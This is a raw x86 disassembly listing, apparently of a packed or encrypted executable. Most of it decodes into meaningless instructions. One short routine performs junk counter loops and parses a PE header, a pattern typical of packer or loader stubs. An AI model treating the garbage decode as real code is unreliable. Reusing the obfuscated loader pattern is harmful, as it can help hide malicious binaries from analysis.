  41002d:	adc    edx,DWORD PTR [edi-0x76c27102]
  410033:	dec    edi
  410034:	ss dec edx
  410036:	mov    ebx,0x8852d1c2
  41003b:	pop    ecx
  41003c:	sub    al,0x1d
  41003e:	mov    dl,0xae
  410040:	inc    eax
  410041:	mov    dh,0xd4
  410043:	sahf   
  410044:	dec    ebx
  410045:	adc    eax,0x7e4fb7e
  41004a:	call   0x8f2c8d4d
  41004f:	int3   
  410050:	ficom  DWORD PTR [esi-0x6d]
  410053:	or     DWORD PTR [eax+0x41],ecx
  410056:	call   0x6461:0x5b3b693e
  41005d:	popf   
  41005e:	jg     0x4100d7
  410060:	sti    
  410061:	jne    0x40ffe9
  410063:	call   0xda4b:0x3d627ac8
  41006a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41006b:	mov    cl,BYTE PTR [edi-0x42]
  41006e:	fcmove st,st(6)
  410070:	retf   0xd3d8
  410073:	pop    ebp
  410074:	shl    BYTE PTR [eax-0x55],0xc4
  410078:	leavew 
  41007a:	dec    DWORD PTR [ebx-0x59]
  41007d:	(bad)  
  41007e:	jge    0x41007c
  410080:	shr    BYTE PTR [ebp+0x7a],1
  410083:	aad    0x4a
  410085:	or     dh,BYTE PTR [esi-0x387ab6d5]
  41008b:	enter  0xa1dd,0x7c
  41008f:	jbe    0x410091
  410091:	jmp    0x41006f
  410093:	sub    edx,DWORD PTR [ebp-0x36]
  410096:	mov    dl,0x99
  410098:	inc    ecx
  410099:	or     ebx,0xc
  41009c:	add    DWORD PTR [ecx-0x25052656],edi
  4100a2:	xchg   ebx,eax
  4100a3:	shr    DWORD PTR [ebp-0x41],0x6
  4100a7:	mov    eax,0x47a3adaa
  4100ac:	adc    dh,BYTE PTR [edx]
  4100ae:	stc    
  4100af:	jae    0x4100d6
  4100b1:	lea    edx,[ebp+0x175ab4f3]
  4100b7:	push   es
  4100b8:	addr16 and ch,ah
  4100bb:	cmp    BYTE PTR ds:0xde7bf03d,ah
  4100c1:	pusha  
  4100c2:	jp     0x410123
  4100c4:	lahf   
  4100c5:	pop    ss
  4100c6:	pop    es
  4100c7:	mov    esp,0x30cbeed9
  4100cc:	xchg   DWORD PTR [edi-0x12],ecx
  4100cf:	xor    eax,DWORD PTR cs:[ebx]
  4100d2:	out    0xd2,al
  4100d4:	mov    ds:0x1889dcf,al
  4100d9:	or     DWORD PTR [edi+0x20893b99],ebx
  4100df:	jg     0x4100fd
  4100e1:	leave  
  4100e2:	sub    ebx,0x4b7a893f
  4100e8:	in     al,dx
  4100e9:	out    dx,al
  4100ea:	lods   al,BYTE PTR ds:[esi]
  4100eb:	dec    edx
  4100ec:	mov    DWORD PTR [ebx],esp
  4100ee:	fcmovu st,st(0)
  4100f0:	jmp    0x410161
  4100f2:	fsub   DWORD PTR [ecx-0x413e79e]
  4100f8:	pinsrw mm3,esi,0x71
  4100fc:	xor    edi,DWORD PTR [esi-0x3a]
  4100ff:	cmp    ecx,DWORD PTR [esi-0xcacdb39]
  410105:	pop    esi
  410106:	fsubr  QWORD PTR [edi+0x3583fd81]
  41010c:	push   es
  41010d:	and    esp,DWORD PTR [edi]
  41010f:	adc    al,0xd6
  410111:	and    ah,0x44
  410114:	js     0x4100d6
  410116:	mov    ecx,0xac29cdc8
  41011b:	jns    0x4100e7
  41011d:	push   cs
  41011e:	mov    eax,DWORD PTR [ebp-0x4]
  410121:	xor    eax,edi
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    ebx,eax
  410136:	aas    
  410137:	cmc    
  410138:	int    0x78
  41013a:	inc    esp
  41013b:	jle    0x4101bb
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x4101b8
  410142:	cmp    al,0xdd
  410144:	or     DWORD PTR [edi+0x19a995ea],esp
  41014a:	mov    bh,0xe1
  41014c:	push   0x7d2d0be2
  410151:	xchg   ebx,eax
  410152:	xchg   DWORD PTR [edx],edi
  410154:	jne    0x4101a3
  410156:	scas   eax,DWORD PTR es:[edi]
  410157:	sub    eax,esi
  410159:	inc    edx
  41015a:	ins    DWORD PTR es:[edi],dx
  41015b:	push   ebp
  41015c:	add    DWORD PTR [ebp-0x5f],ebx
  41015f:	pop    edi
  410160:	add    al,0x5
  410162:	pop    esi
  410163:	mov    ebp,DWORD PTR [ecx-0x74]
  410166:	ret    
  410167:	mov    eax,ds:0x9f11d89d
  41016c:	lea    edx,[ebx]
  41016e:	and    eax,0x8ff3651d
  410173:	jae    0x410188
  410175:	jno    0x4101a5
  410177:	jge    0x41014b
  410179:	in     eax,0xdd
  41017b:	lea    ebp,ds:0xb72047da
  410181:	push   esp
  410182:	into   
  410183:	lods   al,BYTE PTR ds:[esi]
  410184:	push   ebp
  410185:	xchg   ebp,eax
  410186:	std    
  410187:	dec    ebx
  410188:	fs cmp eax,0x61fc90d5
  41018e:	add    al,0x7d
  410190:	(bad)  
  410191:	ret    
  410192:	push   0xe9c88611
  410197:	mov    gs,WORD PTR [edi+0x39]
  41019a:	push   ss
  41019b:	and    dl,BYTE PTR [esi-0xc]
  41019e:	mov    bl,bl
  4101a0:	out    0x98,al
  4101a2:	das    
  4101a3:	call   0xf88:0xa2904687
  4101aa:	ror    BYTE PTR [eax-0x60],cl
  4101ad:	jae    0x41022c
  4101af:	sub    edx,DWORD PTR [eax]
  4101b1:	pop    eax
  4101b2:	jb     0x41020a
  4101b4:	(bad)  
  4101b5:	fdiv   st(1),st
  4101b7:	and    al,0xe7
  4101b9:	inc    ebp
  4101ba:	jmp    0x3e66:0x7d68440c
  4101c1:	jle    0x41014c
  4101c3:	adc    dh,BYTE PTR [ecx+0x27]
  4101c6:	out    0x14,al
  4101c8:	mov    ch,0x59
  4101ca:	inc    edx
  4101cb:	jae    0x41017e
  4101cd:	lods   eax,DWORD PTR ds:[esi]
  4101ce:	pop    es
  4101cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101d0:	adc    eax,0xb558bc0d
  4101d5:	fiadd  DWORD PTR [ecx+0x32]
  4101d8:	or     eax,0x861e3957
  4101dd:	retf   
  4101de:	ficomp WORD PTR [esi-0x8f5211]
  4101e4:	mov    ds:0xef646334,eax
  4101e9:	push   ecx
  4101ea:	jne    0x410257
  4101ec:	out    dx,eax
  4101ed:	xor    DWORD PTR [esi],0x538a809b
  4101f3:	test   DWORD PTR [edi-0x39],edi
  4101f6:	add    DWORD PTR [ecx],edi
  4101f8:	nop
  4101f9:	repnz aam 0xde
  4101fc:	std    
  4101fd:	push   ss
  4101fe:	stos   BYTE PTR es:[edi],al
  4101ff:	mov    WORD PTR [edx+0x6a],gs
  410202:	mov    al,0x1f
  410204:	xor    DWORD PTR [ebp-0x17],ecx
  410207:	inc    ebp
  410208:	xor    ebx,DWORD PTR [edi+ebp*2]
  41020b:	mov    fs,WORD PTR [esi+0x6a]
  41020e:	std    
  41020f:	out    0x4f,eax
  410211:	stc    
  410212:	test   DWORD PTR [edi-0x6c352246],ebx
  410218:	in     eax,dx
  410219:	and    ecx,esi
  41021b:	mov    ecx,0xf2ccd9ed
  410220:	push   esi
  410221:	xor    al,BYTE PTR [ecx]
  410223:	sub    al,0xe6
  410225:	js     0x41027d
  410227:	(bad)  
  410228:	fiadd  WORD PTR [edi-0x27addc21]
  41022e:	mov    ecx,0xb0379877
  410233:	je     0x410282
  410235:	push   esp
  410236:	adc    al,0xb
  410238:	xor    ebp,ebp
  41023a:	outs   dx,BYTE PTR ds:[esi]
  41023b:	(bad)  
  41023c:	pop    esp
  41023d:	or     eax,0x8b1ff32b
  410242:	pop    eax
  410243:	sbb    esp,DWORD PTR [eax+0x6b1c4117]
  410249:	sub    ch,bh
  41024b:	jae    0x41021f
  41024d:	mov    BYTE PTR [edx-0x5e],dh
  410250:	push   0xd30eac63
  410255:	nop
  410256:	mov    eax,ecx
  410258:	inc    ebx
  410259:	pop    ss
  41025a:	mov    cl,0x77
  41025c:	add    BYTE PTR [eax+eax*4+0x6bde332e],dl
  410263:	(bad)  
  410264:	jmp    0x4102b3
  410266:	in     al,0xbc
  410268:	sub    bh,BYTE PTR [esi-0x38]
  41026b:	daa    
  41026c:	xchg   edx,eax
  41026d:	xchg   ebp,eax
  41026e:	jle    0x4102de
  410270:	add    al,0xa6
  410272:	xchg   edi,eax
  410273:	aaa    
  410274:	repz pusha 
  410276:	pusha  
  410277:	(bad)  
  410279:	or     al,0x82
  41027b:	retf   
  41027c:	stos   DWORD PTR es:[edi],eax
  41027d:	rcr    DWORD PTR [eax-0x17],cl
  410280:	dec    edx
  410281:	cmc    
  410282:	ds push eax
  410284:	xchg   esp,eax
  410285:	imul   ebx,DWORD PTR ds:0x9943646f,0x215cfd8b
  41028f:	adc    ebx,DWORD PTR [esi-0x3d3b7003]
  410295:	push   edi
  410296:	mov    cl,0x3d
  410298:	add    al,BYTE PTR [esi-0x45]
  41029b:	mov    ebx,esp
  41029d:	mov    dl,0xff
  41029f:	mov    bh,0x3b
  4102a1:	sub    edi,DWORD PTR [eax-0x6f]
  4102a4:	ror    cl,0xef
  4102a7:	mov    cl,cl
  4102a9:	mov    ah,0xcc
  4102ab:	xchg   ebx,eax
  4102ac:	into   
  4102ad:	add    al,0x5b
  4102af:	imul   edi,DWORD PTR [ebp+0x59b82e2b],0x48a95d06
  4102b9:	push   0xae965869
  4102be:	xor    ah,BYTE PTR [eax]
  4102c0:	add    ch,BYTE PTR [ebx]
  4102c2:	push   ds
  4102c3:	xchg   esi,eax
  4102c4:	scas   al,BYTE PTR es:[edi]
  4102c5:	cmp    eax,0x5ecceb00
  4102ca:	jnp    0x410297
  4102cc:	loop   0x410285
  4102ce:	loope  0x4102e2
  4102d0:	ficomp WORD PTR [edx+ebp*2-0x6ff653a]
  4102d7:	push   edx
  4102d8:	mov    bl,0x6
  4102da:	cmp    al,0xa3
  4102dc:	lea    edx,[ebp-0x4c8d2477]
  4102e2:	mov    ?,WORD PTR [ecx]
  4102e4:	and    DWORD PTR [eax+0x54c68e41],esp
  4102ea:	leave  
  4102eb:	into   
  4102ec:	or     al,0x93
  4102ee:	or     al,0x9d
  4102f0:	mov    WORD PTR [ebp-0x4fa2c92e],cs
  4102f6:	mov    ebx,0x4d5ae7e4
  4102fb:	imul   edx,DWORD PTR ds:0xd9dd4078,0x7b048b48
  410305:	push   0xdfd1c945
  41030a:	adc    al,0x8c
  41030c:	scas   al,BYTE PTR es:[edi]
  41030d:	call   0x92bf465d
  410312:	xor    eax,0x328e80e9
  410317:	fsubr  DWORD PTR [edi-0x3e8bdbf1]
  41031d:	mov    cl,0x10
  41031f:	dec    ecx
  410320:	repnz mov WORD PTR [edi],cs
  410323:	fild   DWORD PTR [edi]
  410325:	pop    esp
  410326:	mov    esp,DWORD PTR [ebx]
  410328:	pop    ds
  410329:	add    DWORD PTR ds:0x61771f08,edx
  41032f:	jmp    0xc435:0x73f767ae
  410336:	jge    0x410300
  410338:	sbb    esp,0xfb6279bc
  41033e:	mov    dl,0x93
  410340:	cmp    WORD PTR [edx],0x79
  410344:	xchg   edx,eax
  410345:	push   ebx
  410346:	bound  edi,QWORD PTR [eax-0x3c15cb22]
  41034c:	pop    ebx
  41034d:	iret   
  41034e:	shl    DWORD PTR [eax+ebx*8],cl
  410351:	dec    ecx
  410352:	pop    es
  410353:	lods   eax,DWORD PTR ds:[esi]
  410354:	mov    bl,0x16
  410356:	mov    ebp,0xe4697be0
  41035b:	scas   eax,DWORD PTR es:[edi]
  41035c:	jnp    0x410394
  41035e:	js     0x41031e
  410360:	lods   al,BYTE PTR ds:[esi]
  410361:	wbinvd 
  410363:	xor    esi,DWORD PTR [ecx+0x4e]
  410366:	jno    0x410382
  410368:	cmp    eax,0x349ffadf
  41036d:	jnp    0x4103ed
  41036f:	mov    ebx,0xa98d984
  410374:	cmp    al,0xfa
  410376:	mov    ecx,0x9ee51abe
  41037b:	pop    esp
  41037c:	xor    DWORD PTR [esi-0x42],edx
  41037f:	cmp    BYTE PTR [edx-0x7f],bh
  410382:	cmp    ebp,DWORD PTR [edx-0x3e88a4c2]
  410388:	sbb    DWORD PTR [edi+0x4f],edx
  41038b:	pop    eax
  41038c:	shr    DWORD PTR [ebp-0x57],1
  41038f:	rcr    BYTE PTR [edi-0x1a7c5ad0],1
  410395:	jle    0x4103b6
  410397:	xor    edi,edx
  410399:	stos   BYTE PTR es:[edi],al
  41039a:	retf   0x3b53
  41039d:	outs   dx,DWORD PTR ds:[esi]
  41039e:	scas   eax,DWORD PTR es:[edi]
  41039f:	and    DWORD PTR [eax-0x75],eax
  4103a2:	mov    ecx,0x72d1fdff
  4103a7:	and    BYTE PTR [edi],bl
  4103a9:	push   ds
  4103aa:	adc    eax,0x845db738
  4103af:	pop    ds
  4103b0:	in     al,0xa8
  4103b2:	outs   dx,BYTE PTR ds:[esi]
  4103b3:	shl    esi,cl
  4103b5:	inc    edi
  4103b6:	scas   al,BYTE PTR es:[edi]
  4103b7:	mov    cl,0xc6
  4103b9:	sbb    DWORD PTR [ecx],edi
  4103bb:	add    al,0xbd
  4103bd:	sti    
  4103be:	les    esi,FWORD PTR [edx-0x5]
  4103c1:	cmp    DWORD PTR [edx-0x673495c2],0xffffffc4
  4103c8:	or     ebp,ebp
  4103ca:	cmp    al,0xb5
  4103cc:	and    DWORD PTR [esp+ebx*2],esi
  4103cf:	data16 int3 
  4103d1:	call   0x4282:0x840ade11
  4103d8:	outs   dx,BYTE PTR ds:[esi]
  4103d9:	outs   dx,BYTE PTR ds:[esi]
  4103da:	mov    edi,0x5d5fd33b
  4103df:	hlt    
  4103e0:	adc    ebp,0x391e9174
  4103e6:	xchg   ebx,eax
  4103e7:	cmp    eax,0x977f0d28
  4103ec:	test   DWORD PTR [eax-0x65e424db],0xbdba1fec
  4103f6:	popa   
  4103f7:	ret    0x59b0
  4103fa:	cmp    DWORD PTR [esi+0x5e],ebp
  4103fd:	push   ds
  4103fe:	sbb    eax,0xd470313d
  410403:	fs mov al,0x29
  410406:	add    BYTE PTR [ecx-0x77],al
  410409:	xchg   esp,eax
  41040a:	fs pushf 
  41040c:	in     eax,0xf6
  41040e:	out    dx,eax
  41040f:	sahf   
  410410:	popf   
  410411:	outs   dx,DWORD PTR ds:[esi]
  410412:	adc    ah,bl
  410414:	xchg   DWORD PTR [eax+0x1730a59a],esp
  41041a:	outs   dx,BYTE PTR ds:[esi]
  41041b:	mov    cl,0xf8
  41041d:	inc    ebx
  41041e:	out    0xe9,eax
  410420:	mov    bh,0x8d
  410422:	mov    bl,0x9c
  410424:	mov    bh,0x6d
  410426:	sbb    esi,esp
  410428:	aam    0x5d
  41042a:	or     esp,DWORD PTR [eax+ebp*4]
  41042d:	aad    0xf7
  41042f:	jno    0x410437
  410431:	into   
  410432:	ret    0xd294
  410435:	pop    ebx
  410436:	xchg   ecx,eax
  410437:	ret    0xc151
  41043a:	mov    ebp,0x6579745b
  41043f:	mov    ch,0x29
  410441:	jmp    0x1fc9160b
  410446:	dec    esp
  410447:	cmp    ebp,edx
  410449:	adc    eax,0xdc6228c7
  41044e:	(bad)  
  41044f:	cmp    BYTE PTR [edi-0x22],dl
  410452:	pop    esi
  410453:	aaa    
  410454:	pop    es
  410455:	dec    eax
  410456:	adc    eax,DWORD PTR [esi]
  410458:	ret    
  410459:	push   eax
  41045a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41045b:	push   ecx
  41045c:	mov    dh,0x0
  41045e:	pop    ds
  41045f:	arpl   WORD PTR [esi-0x4c3b1156],cx
  410465:	xor    edx,DWORD PTR [eax+0x75ff0cb5]
  41046b:	lds    ebx,FWORD PTR [ecx-0x5d0dddd3]
  410471:	add    al,0xcd
  410473:	xchg   ebp,eax
  410474:	mov    ebp,0x402e2c94
  410479:	sahf   
  41047a:	stos   BYTE PTR es:[edi],al
  41047b:	sbb    dh,BYTE PTR ds:0x4988810f
  410481:	xchg   edx,eax
  410482:	push   ecx
  410483:	lahf   
  410484:	or     eax,0xa8248a4
  410489:	inc    edi
  41048a:	fs lahf 
  41048c:	cmp    DWORD PTR [edx],edi
  41048e:	or     ch,BYTE PTR [edi+0x55]
  410491:	shl    BYTE PTR [edi+0x11],0xa2
  410495:	xchg   ebx,eax
  410496:	sbb    ah,bl
  410498:	test   DWORD PTR [edx],esp
  41049a:	push   es
  41049b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41049c:	mov    esp,0xcc76cb9d
  4104a1:	shr    DWORD PTR [esi-0x23],0x3e
  4104a5:	add    ecx,esi
  4104a7:	fisttp DWORD PTR [edx+0x73]
  4104aa:	mov    fs,WORD PTR [ebp-0x1f3407f2]
  4104b0:	mov    DWORD PTR [ebx-0x69a49ccf],esi
  4104b6:	push   0xc95ec603
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x4345f7,0x1f
  4104d3:	cmp    DWORD PTR ds:0x4345f7,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x4345f7,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x4345f7,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x4345f7
  410508:	dec    eax
  410509:	mov    ds:0x4345f7,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x4345f7
  410516:	dec    eax
  410517:	mov    ds:0x4345f7,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x434647,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43468f,0x434713
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x43464f,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434687
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x4345eb,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x4345eb
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x4345eb,edx
  410571:	cmp    DWORD PTR ds:0x4345eb,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x4345eb,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x4345eb,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x4345eb
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x4345eb,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	mov    al,0x71
  4105ee:	daa    
  4105ef:	dec    eax
  4105f0:	test   BYTE PTR [edi+0x7e],0x7e
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x4105e9
  4105f9:	adc    eax,0xd3d45bbe
  4105fe:	ret    0x62ca
  410601:	into   
  410602:	or     eax,0xc5549326
  410607:	jl     0x410620
  410609:	push   ds
  41060a:	adc    al,0x1e
  41060c:	inc    edi
  41060d:	(bad)  
  41060e:	adc    al,0x30
  410610:	fdivr  QWORD PTR [ecx+0x5]
  410613:	xlat   BYTE PTR ds:[ebx]
  410614:	jne    0x4105c8
  410616:	(bad)
  41061a:	test   al,0xe8
  41061c:	jle    0x41062a
  41061e:	test   eax,0xc2aee6fa
  410623:	pop    ds
  410624:	mov    BYTE PTR [edx-0x30],bl
  410627:	int    0x27
  410629:	ins    DWORD PTR es:[edi],dx
  41062a:	push   esi
  41062b:	shl    ah,cl
  41062d:	cmp    DWORD PTR [esi],ebp
  41062f:	and    DWORD PTR [eax-0x11],eax
  410632:	out    dx,eax
  410633:	pop    es
  410634:	xlat   BYTE PTR ds:[ebx]
  410635:	jns    0x41063b
  410637:	xchg   ah,dh
  410639:	mov    cl,0x75
  41063b:	xchg   ebx,edi
  41063d:	out    0x51,al
  41063f:	lds    edx,FWORD PTR [esi]
  410641:	inc    esp
  410642:	mov    edi,0x2fa6409a
  410647:	jne    0x4106b7
  410649:	xor    eax,0x374bf9a
  41064e:	call   0xfe3aedc1
  410653:	in     al,0x74
  410655:	push   ebp
  410656:	aaa    
  410657:	mul    DWORD PTR [ecx+0x2426ad95]
  41065d:	sbb    al,0xc1
  41065f:	fist   WORD PTR [ebp-0x74]
  410662:	push   eax
  410663:	xchg   ecx,eax
  410664:	xchg   DWORD PTR [ebp+0x7c],eax
  410667:	sub    BYTE PTR [eax-0x1bb30e0f],cl
  41066d:	mov    ebp,0x9efd8dc8
  410672:	cmp    ch,BYTE PTR [ebp-0x4f07446d]
  410678:	sbb    eax,ebx
  41067a:	push   esp
  41067b:	call   0x44d:0x408f815f
  410682:	neg    eax
  410684:	ret    0xf717
  410687:	push   esi
  410688:	xor    ah,BYTE PTR [edx]
  41068a:	(bad)  
  41068b:	shr    ecx,cl
  41068d:	cdq    
  41068e:	(bad)  
  41068f:	jmp    0x41061b
  410691:	push   edx
  410692:	test   al,0xd5
  410694:	out    0x78,eax
  410696:	call   0xe512:0x32cf6604
  41069d:	cmp    BYTE PTR [ecx],al
  41069f:	cld    
  4106a0:	sti    
  4106a1:	ror    BYTE PTR [edx+0x3d],1
  4106a4:	fcom   QWORD PTR [esi+0x5e00e5f6]
  4106aa:	push   edx
  4106ab:	mov    ds:0xb66e7b40,eax
  4106b0:	push   esp
  4106b1:	add    BYTE PTR [edx+0x23],0xb0
  4106b5:	push   esp
  4106b6:	outs   dx,BYTE PTR ds:[esi]
  4106b7:	scas   al,BYTE PTR es:[edi]
  4106b8:	xchg   esp,eax
  4106b9:	mov    edi,0xb9c4e2a2
  4106be:	add    ch,BYTE PTR [ecx+0x504458f3]
  4106c4:	clc    
  4106c5:	fldcw  WORD PTR gs:[ebp+0xdbc6522]
  4106cc:	(bad)  
  4106cd:	pushf  
  4106ce:	popa   
  4106cf:	cmp    BYTE PTR [esi],0xf4
  4106d2:	jns    0x41073b
  4106d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106d5:	pop    edi
  4106d6:	sbb    BYTE PTR [edx],0x43
  4106d9:	aad    0xde
  4106db:	out    0x82,al
  4106dd:	inc    esp
  4106de:	or     BYTE PTR [edi],dh
  4106e0:	stos   BYTE PTR es:[edi],al
  4106e1:	xchg   DWORD PTR [ecx],eax
  4106e3:	retf   0xf6b5
  4106e6:	jnp    0x4106aa
  4106e8:	inc    ebp
  4106e9:	fidiv  WORD PTR [edi+edx*1]
  4106ec:	dec    eax
  4106ed:	inc    esi
  4106ee:	cmp    bl,dh
  4106f0:	popa   
  4106f1:	aaa    
  4106f2:	iret   
  4106f3:	push   ds
  4106f4:	aam    0xd1
  4106f6:	and    ch,BYTE PTR [ecx+0xd75d4e8]
  4106fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106fd:	jbe    0x4106c5
  4106ff:	adc    DWORD PTR [ecx-0x7b],ecx
  410702:	push   ecx
  410703:	dec    ebp
  410704:	fild   WORD PTR [ebx]
  410706:	nop
  410707:	lds    ecx,FWORD PTR [ebx+eax*4]
  41070a:	push   esi
  41070b:	cmc    
  41070c:	add    DWORD PTR ds:[ebx-0x3928e7c9],ecx
  410713:	and    DWORD PTR [ebp-0x5e3ae50],ebp
  410719:	cmp    eax,ecx
  41071b:	std    
  41071c:	adc    BYTE PTR [ebp-0x2b69ded9],cl
  410722:	mov    dl,0xbd
  410724:	sub    bl,dl
  410726:	cmc    
  410727:	cmc    
  410728:	sub    al,0xa7
  41072a:	mov    eax,0x899fa0c9
  41072f:	jmp    0x3c2074b2
  410734:	jns    0x410730
  410736:	jo     0x4106eb
  410738:	dec    edi
  410739:	call   0xaf2be68a
  41073e:	loopne 0x410728
  410740:	add    eax,0x54bf3ec1
  410745:	je     0x4106e9
  410747:	cmp    eax,0xba0cb85e
  41074c:	push   ss
  41074d:	lock into 
  41074f:	call   0xb47e4857
  410754:	push   ebx
  410755:	pop    ebp
  410756:	les    esi,FWORD PTR [eax-0x62]
  410759:	ret    
  41075a:	js     0x4106f2
  41075c:	add    al,0x17
  41075e:	cmp    BYTE PTR [edi],bh
  410760:	loopne 0x4107a1
  410762:	test   al,0x85
  410764:	sub    BYTE PTR [eax],dh
  410766:	popf   
  410767:	xchg   edx,eax
  410768:	and    al,dl
  41076a:	cmp    ebx,DWORD PTR [ebp-0x50]
  41076d:	not    BYTE PTR [edx-0x1f0d3b30]
  410773:	rol    BYTE PTR ds:0xd8a0b69c,0x59
  41077a:	sti    
  41077b:	sahf   
  41077c:	add    BYTE PTR [eax],ch
  41077e:	imul   DWORD PTR [edx-0x1a]
  410781:	dec    esi
  410782:	mul    ecx
  410784:	paddb  mm2,QWORD PTR [ebx+0x2]
  410788:	mov    DWORD PTR [eax],ecx
  41078a:	in     eax,dx
  41078b:	push   ecx
  41078c:	popf   
  41078d:	add    esp,DWORD PTR [ebp+0x48dab1a0]
  410793:	std    
  410794:	aam    0x1e
  410796:	mov    esi,DWORD PTR [ebp+0x8]
  410799:	mov    ecx,0x327299
  41079e:	jmp    0x410959
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	dec    eax
  4107b0:	sbb    al,0x6
  4107b2:	fwait
  4107b3:	adc    al,0x41
  4107b5:	jle    0x410835
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x410833
  4107bc:	(bad)
  4107bf:	mov    dl,0x52
  4107c1:	dec    ebx
  4107c2:	sbb    ebp,ebp
  4107c4:	sbb    DWORD PTR [ecx+0x4b3e4316],eax
  4107ca:	sbb    DWORD PTR [edx-0x2edde2ed],edi
  4107d0:	pop    esp
  4107d1:	push   ebp
  4107d2:	sahf   
  4107d3:	out    0x39,al
  4107d5:	sbb    ebx,DWORD PTR [ecx+0x5f]
  4107d8:	shufps xmm0,XMMWORD PTR [esi+0x64bb6baa],0xb6
  4107e0:	int    0xef
  4107e2:	mov    al,ds:0x62598991
  4107e7:	mov    dl,0xc0
  4107ea:	adc    bh,cl
  4107ec:	pop    esi
  4107ed:	mul    BYTE PTR [edx]
  4107ef:	cmp    eax,0x2ced24d4
  4107f4:	sbb    ah,bh
  4107f6:	cld    
  4107f7:	or     DWORD PTR [ecx+0x29370f79],esi
  4107fd:	popf   
  4107fe:	pop    es
  4107ff:	jne    0x4107d4
  410801:	iret   
  410802:	retf   
  410803:	xor    BYTE PTR [edx-0x4a],ah
  410806:	pop    ecx
  410807:	adc    al,0x43
  410809:	sti    
  41080a:	arpl   WORD PTR [ebp-0x577dfdca],si
  410810:	imul   ebp,ebp,0x26
  410813:	push   ebx
  410814:	in     eax,0x4d
  410816:	adc    al,0x47
  410818:	loopne 0x410888
  41081a:	jne    0x41085e
  41081c:	sub    al,0x3d
  41081e:	daa    
  41081f:	inc    ebp
  410820:	jmp    0x1ac0:0xca8e5d2b
  410827:	and    eax,0x87e0f48b
  41082c:	nop
  41082d:	(bad)  
  41082e:	sub    al,0x78
  410830:	enter  0x1b08,0x87
  410834:	test   eax,0xb7e60a19
  410839:	dec    ebp
  41083a:	(bad)  
  41083c:	dec    edi
  41083d:	in     eax,0xb3
  41083f:	mov    ds:0x1ae5dd8d,al
  410844:	mov    BYTE PTR [ecx+0x507daa6e],0xa2
  41084b:	mov    bh,0x31
  41084d:	cmp    eax,0x4ba206b
  410852:	mov    ds:0x8138b885,eax
  410857:	adc    BYTE PTR [edi-0x458e9133],0x5a
  41085e:	and    esp,ebp
  410860:	mov    cl,0xd9
  410862:	push   ebx
  410863:	xlat   BYTE PTR ds:[ebx]
  410864:	sbb    al,0x71
  410866:	mov    ch,0x97
  410868:	jo     0x41082f
  41086a:	out    dx,al
  41086b:	fiadd  DWORD PTR [edi+0x28]
  41086e:	jle    0x4108e7
  410870:	mov    ecx,0x5faa77a2
  410875:	and    DWORD PTR ds:0x99004fe0,esp
  41087b:	aam    0xe8
  41087d:	mov    al,ds:0xa160c8f7
  410882:	xchg   esp,ebx
  410884:	mov    al,ds:0xc73b955f
  410889:	mov    WORD PTR [edx+ebp*4+0x61563b35],ss
  410890:	jo     0x41085b
  410892:	inc    ebx
  410893:	loop   0x410884
  410895:	in     eax,dx
  410896:	outs   dx,DWORD PTR ds:[esi]
  410897:	test   eax,0xae677867
  41089c:	mov    ecx,0x9e4588b0
  4108a1:	sbb    DWORD PTR [eax+0x3a],0xa09a45dd
  4108a8:	or     al,0x8f
